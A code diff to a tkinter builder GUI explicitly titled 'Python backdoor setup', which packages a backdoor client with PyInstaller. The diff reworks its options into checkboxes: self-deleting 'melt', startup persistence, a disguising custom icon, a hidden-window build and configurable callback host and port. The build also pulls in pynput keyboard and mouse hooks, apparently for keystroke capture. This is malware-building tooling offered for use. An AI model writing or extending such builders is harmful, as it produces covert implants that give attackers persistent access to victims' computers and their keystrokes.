@@ -14,7 +14,6 @@ from tkinter import scrolledtext
 from tkinter import filedialog
 
 import os
-import shutil
 import subprocess
 import socket
 import sys
@@ -101,23 +100,23 @@ class Setup:
         self.loopback_ip = "127.0.0.1"
         self.host = self.local_ip
 
-        self.melt = False
-        self.add_startup = False
-        self.UPX = False
+        self.root = Tk()
+        self.melt = IntVar()
+        self.add_startup = IntVar()
+        self.is_console = IntVar()
+        self.one_file = IntVar()
+        self.icon = IntVar()
         self.icon_path = None
         self.is_hostname = False
-        self.is_console = False
         self.log = ""
 
         self.create_ui()
 
     def create_ui(self):
-        self.root = Tk()
-
         # dummy value
         self.root_log = Label()
 
-        self.root.geometry("500x200")
+        self.root.geometry("360x235")
         self.root.resizable(0, 0)
         self.root.title("Python backdoor setup")
 
@@ -147,25 +146,25 @@ class Setup:
         self.port_et.grid(column=1, row=1, pady=8)
 
         self.misc_frame = LabelFrame(self.frame, text="Misc.")
-        self.misc_frame.pack()
+        self.misc_frame.pack(side=LEFT)
 
-        self.melt_btn = Button(self.misc_frame, text="Melt file", command=self.melt_btn_callback)
-        self.melt_btn.grid(column=0, row=0, padx=8, pady=8)
+        self.onefile_cb = Checkbutton(self.misc_frame, text="One file", variable=self.one_file)
+        self.onefile_cb.grid(column=0, row=0, sticky=W)
 
-        self.add_startup_btn = Button(self.misc_frame, text="Add to startup", command=self.add_startup_btn_callback)
-        self.add_startup_btn.grid(column=1, row=0, padx=8, pady=8)
+        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup", variable=self.add_startup)
+        self.startup_cb.grid(column=0, row=1, sticky=W)
 
-        self.add_icon_btn = Button(self.misc_frame, text="Custom icon", command=self.add_icon_btn_callback)
-        self.add_icon_btn.grid(column=2, row=0, padx=8, pady=8)
+        self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon, command=self.add_icon_cb_callback)
+        self.add_icon_cb.grid(column=0, row=2, sticky=W)
 
-        self.upx_btn = Button(self.misc_frame, text="Use UPX", command=self.upx_btn_callback)
-        self.upx_btn.grid(column=3, row=0, padx=8, pady=8)
+        self.melt_cb = Checkbutton(self.misc_frame, text="Melt file", variable=self.melt, command=self.melt_cb_callback)
+        self.melt_cb.grid(column=0, row=3, sticky=W)
 
-        self.console_btn = Button(self.misc_frame, text="Console app", command=self.console_btn_callback)
-        self.console_btn.grid(column=4, row=0, padx=8, pady=8)
+        self.console_cb = Checkbutton(self.misc_frame, text="Console app", variable=self.is_console)
+        self.console_cb.grid(column=0, row=4, sticky=W)
 
-        self.build_btn = Button(self.frame, text="Build", width=16, command=self.build_btn_callback)
-        self.build_btn.pack(pady=8, padx=8)
+        self.build_btn = Button(self.frame, text="Build", width=36, command=self.build_btn_callback)
+        self.build_btn.pack(padx=8, side=BOTTOM, anchor=W)
 
         self.root.mainloop()
 
@@ -194,11 +193,6 @@ class Setup:
         self.log_sbtxt.insert(INSERT, log)
         self.log_sbtxt.configure(state="disabled")
 
-    def console_btn_callback(self):
-        self.console_btn["state"] = "disabled"
-
-        self.is_console = True
-
     def build_btn_callback(self):
         port = self.port_et.get()
 
@@ -215,33 +209,27 @@ class Setup:
             self.disable_build_ui()
 
             client_args = \
-                [f"'{self.host}'", str(port), str(self.is_hostname), str(self.add_startup), str(self.melt)]
+                [f"'{self.host}'", str(port), str(self.is_hostname), str(bool(self.add_startup.get())), str(bool(self.melt.get()))]
 
             save_files(client_args)
 
-            upx_command = ""
             icon_command = ""
             windowed = "--windowed "
+            onefile = ""
 
-            if self.is_console:
+            if bool(self.is_console.get()):
                 windowed = ""
 
-            if not self.UPX:
-                upx_command = "--noupx "
-
-                # https://github.com/pyinstaller/pyinstaller/issues/3005
-                try:
-                    shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")
-                except Exception:
-                    pass
-
             if self.icon_path:
-                icon_command = f"--icon {self.icon_path}"
+                icon_command = f"--icon {self.icon_path} "
 
-            command_arg = f"{self.pyinstaller} src/client.py {upx_command}--hidden-import pynput.keyboard._win32 " \
-                          f"--hidden-import pynput.mouse._win32 --exclude-module FixTk --exclude-module tcl " \
-                          f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module " \
-                          f"Tkinter --onefile {windowed}{icon_command} -y"
+            if bool(self.one_file.get()):
+                onefile = "--onefile"
+
+            command_arg = f"{self.pyinstaller} src/client.py {windowed}{icon_command}{onefile} -y --clean --hidden-import " \
+                          f"pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module " \
+                          f"FixTk --exclude-module tcl --exclude-module tk --exclude-module _tkinter --exclude-module " \
+                          f"tkinter --exclude-module Tkinter "
 
             def run_command():
                 self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -252,29 +240,24 @@ class Setup:
 
             threading.Thread(target=run_command, daemon=False).start()
 
-    def add_icon_btn_callback(self):
-        path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])
+    def melt_cb_callback(self):
+        if self.melt.get() == 1:
+            self.one_file.set(1)
+            self.onefile_cb.config(state=DISABLED)
+        else:
+            self.onefile_cb.config(state=ACTIVE)
 
-        if path is not None:
-            self.icon_path = "\"" + path.name + "\""
-            path.close()
-            self.add_icon_btn["state"] = "disabled"
+    def add_icon_cb_callback(self):
+        if self.icon.get() == 1:
+            path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])
 
-    def upx_btn_callback(self):
-        answer = tkinter.messagebox.askyesno("Use UPX",
-                                             "UPX may not work on fresh computers (eg. new installs)\n\nUse UPX?")
-
-        if answer is not None and answer:
-            self.upx_btn["state"] = "disabled"
-            self.UPX = True
-
-    def melt_btn_callback(self):
-        self.melt_btn["state"] = "disabled"
-        self.melt = True
-
-    def add_startup_btn_callback(self):
-        self.add_startup_btn["state"] = "disabled"
-        self.add_startup = True
+            if path is not None:
+                self.icon_path = "\"" + path.name + "\""
+                path.close()
+            else:
+                self.icon.set(0)
+        else:
+            self.icon_path = None
 
     def host_cb_callback(self, evt):
         value = evt.widget.get()
@@ -286,7 +269,7 @@ class Setup:
             self.host_widg = Label(self.host_frame)
             self.host_widg.grid(column=2, row=0, padx=8, pady=5)
         else:
-            self.host_widg = Entry(self.host_frame)
+            self.host_widg = Entry(self.host_frame, width=12)
             if value == "DNS hostname":
                 self.host_widg.insert(END, "hostname")
                 self.is_hostname = True
